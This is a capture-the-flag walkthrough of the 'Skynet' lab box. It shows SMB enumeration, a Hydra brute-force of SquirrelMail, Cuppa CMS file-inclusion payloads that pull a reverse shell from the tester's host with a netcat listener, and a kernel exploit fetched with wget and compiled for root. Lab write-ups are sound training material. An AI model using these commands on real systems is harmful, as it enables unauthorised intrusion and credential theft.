# Go in Depth ON:
IMAP and POP3

## Initial Recon
The first thing we'll do is run nmap on the target. I first run a Scripts and Version scan and then an all ports scan to see if anything unusual is running on unexpected ports. The results show the box is running SSH, HTTP, SMB, POP3, and IMAP. IMAP (Internet Message Access Protocol) and POP3 (Post Office Protocol) are both services related to email. 
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)
|   256 57c07502712d193183dbe4fe679668cf (ECDSA)
|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP PIPELINING UIDL SASL AUTH-RESP-CODE RESP-CODES CAPA
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGINDISABLEDA0001 SASL-IR ENABLE more LOGIN-REFERRALS OK ID Pre-login LITERAL+ have post-login listed IMAP4rev1 capabilities IDLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-12-03T07:38:44
|_  start_date: N/A
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-12-03T01:38:44-06:00
```
## HTTP
The IP takes me to a basic website with what seems to be a search function. However, the website does not seem to be functional. The two buttons, "Skynet Search" and "I'm Feeling Lucky" do send POST requests, but don't include what I put in the search bar.

```
POST / HTTP/1.1
Host: 10.10.171.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Origin: http://10.10.171.159
Connection: close
Referer: http://10.10.171.159/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
DNT: 1

submit=Skynet+Search
```

![Alt text](file:///home/kali/Pictures/Skynet-Search-Burp.png "")

I decide to run FFUF on the site to see what it turns up:
```
        /'___\  /'___\           /''___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.2.177/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : .html .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 156ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 2141ms]
admin                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 3146ms]
config                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 161ms]
index.html              [Status: 200, Size: 523, Words: 26, Lines: 19, Duration: 157ms]
squirrelmail            [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 158ms]
ai                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 157ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 156ms]
.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 158ms]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 157ms]
:: Progress: [120000/120000] :: Job [1/1] :: 235 req/sec :: Duration: [0:08:07] :: Errors: 8 ::
```
Most of these give me a 403 Forbidden response, except /squirrelmail.

Squirrelmail takes me to a login page for an email service. Interestingly, It doesn't look like I need the full email address to log in, only a username and password. I try a couple obvious creds like `admin:admin`, `admin:password`, etc, as well as basic SQL injection: `admin' OR 1=1-- -:password`, but don't get in. It was worth a shot.

A `searchsploit` for squirrelmail 1.4 search turns up a few interesting results for Local File Inclusion and Remote Code Execution, but both of these look like I need log in creds.

Time to move on to SMB.

## SMB
Running `smbmap` reveals that the share `anonymous` allows anonymous log in and read access. In the share are 4 files, attention.txt, log1.txt, log2.txt, and log3.txt. `Attention.txt` contains a message about a malfunction causing passwords to change, and that employees must change their passwords. It also contains a possible username: `Miles Dyson`.` Log1.txt` contains what looks like a wordlist of passwords. Log2.txt and Log3.txt are both empty 
```
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson

cyborg007haloterminator
terminator22596
terminator219
<... SNIP ...>
Walterminator
79terminator6
1996terminator
```
Using this username and password list I decide to bruteforce `squirrelmail`. The wordlist is short enough that I could manually copy and paste each password, but it's more fun to use hydra. I create a short username wordlist containing a few variations of Miles Dyson, "milesdyson, mdyson, miles, etc.". I use burp to grab the url and POST data for the login, and use the incorrect password error from the site as the fail state. After a little while, hydra returns the password and username: `milesdyson:cyborg007haloterminator`
```bash
hydra -L usernames.txt -P log1.txt -u $IP http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect"
<... SNIP ..>
[80][http-post-form] host: 10.10.133.117   login: milesdyson   password: cyborg007haloterminator
```
In the inbox are 3 emails, 2 contain what I think are Terminator references, but one contains an SMB password. 

Now that we have creds for Squirrelmail, we could try some of those exploits we saw before. Spoiler alert: they didn't work. Perhaps if I had finagled it some more I could have got it to work. I ran the bash script, and then tried to manually do what the bash script was doing. I wasn't successful with either of these, and decided to come back to it if I hit a dead end in the future. Time to hop back into SMB with our new creds.

I can now access the "milesdyson" smb share. In it is a folder caled "notes", in that is a file called "important.txt". In that file is a line `Add features to beta CMS /45kra24zxs28v3yd`. This looks like a could be a directory that's been "hidden by obscurity."

## Directory /45kra24zxs28v3yd
It is indeed! It's Miles' personal page. Nothing interesting on this page so I decide to fuzz it. This turns up a page called "administrator"
```
        /'___\  /'___\           /''___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.2.177/45kra24zxs28v3yd/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : .html .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

administrator           [Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 157ms]
index.html              [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 158ms]
:: Progress: [120000/120000] :: Job [1/1] :: 251 req/sec :: Duration: [0:08:04] :: Errors: 8 ::
```
/Administrator is a login page for "Cuppa CMS". 

I try to log in to this with the 2 sets of creds I found. Neither work. Neither does basic SQLi. Inspecting the page source reveals a commented line of html that looks like a password reset form. I intercept the page response in burp and uncomment the line, and indeed this does load a password reset function. This prompts me an email address, I have access to Miles' email account, maybe I can reset his password? Interestingly, I can't actually find his exact email address in Squirrelmail. I take a couple guesses, but I don't manage to get an email in the inbox.

I do a `searchsploit` for "Cuppa CMS" which brings back one lone result, for Local & Remote File Inclusion. Reading the exploit tells me that the url `http://{TARGET IP}/{CUPPA DIRECTORY}/alerts/alertConfigField.php?urlConfig=` is vulnerable to LFI/RFI. 

I give it a try with `http://$IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`, and to my great joy, this just works! No authentication needed.

I test the RFI by setting up a python server on my attack box with `python3 -m http.server 80` and using the payload `urlConfig=http://{MY IP}/` and sure enough I get a hit. Now I just need to host a reverse shell and get the site to execute it. I grab the classic one that comes on Kali and in SecLists, modify the IP and port, and put it in my server directory. I start up a netcat listener `nc -lvnp 9001` and use the RFI payload `urlConfig=http://{MY IP}/shell.php` and sure enough, I get a shell as www-data! Now to escalate privileges.

## Priv Esc
*Note: The method I first used for priv esc I don't think was the intended method. But it used a CVE from 2017, and the box came out in 2020 so to me it's fair game. I'll go over the intended priv esc after this.*

First things first, I upgrade my shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")' # Enter a python PTY
CTRL+Z # Background my rev shell to get back on my attacking machine
stty raw -echo; fg # Enter this on attacking machine
# Press Enter twice. This will get you back onto victim box.
export SHELL=bash && export TERM=xterm && stty rows 67 columns 125
```
Looking around I see I'm not part of any special groups, and I don't have www-data's password so I don't know what I can run with sudo. I look at `/etc/passwd` to see what user's are on the box. Sure enough, there's good old Miles. I `su milesdyson` and try the 2 passwords I have for him, and the Squirrelmail one gets me on his account. I check `sudo -l` and unfortunately, he has no sudo privileges. In his home directory is a script running as root called `backup.sh` I check `/etc/crontab` and sure enough, the script runs once a minute. 

I figure this is probably the intended priv esc method but I want to look around and see if there's another way. 

Eventually I run `linpeas.sh`, and it highlights the Linux kernel version in red. I do a `searchsploit Linux Kernel 4.8.0` and one result for Privilege Escalation looks promising. Reading the exploit, it looks like it was tested on the exact kernel this box is running! `4.8.0-58-generic #63~16.04.1-Ubuntu SMP`

I grab the exploit from searchsploit, download it to the victim box, compile it, execute it, and just like that it gave me a root shell.
```bash
searchsploit -m linux/local/43418.c # Attacker : Download exploit
mv  43418.c pwn.c # Attacker : Rename it for ease of use
wget http://$IP/pwn.c # Victim : move exploit to victim
gcc pwn.c -o pwn # Victim : Compile the exploit
./pwn # Victim : Run exploit, become root >:)
```
Now to be fair, this kernel exploit involves memory corruption, and is currently above my paygrade, ie, I don't really understand how it works. In the exploit code itself is a link to Rick Larabee's blog where he goes more in depth on it and it's some good reading if you're up for it: https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html

## Intended Priv Esc Method
So the script running in milesdyson's home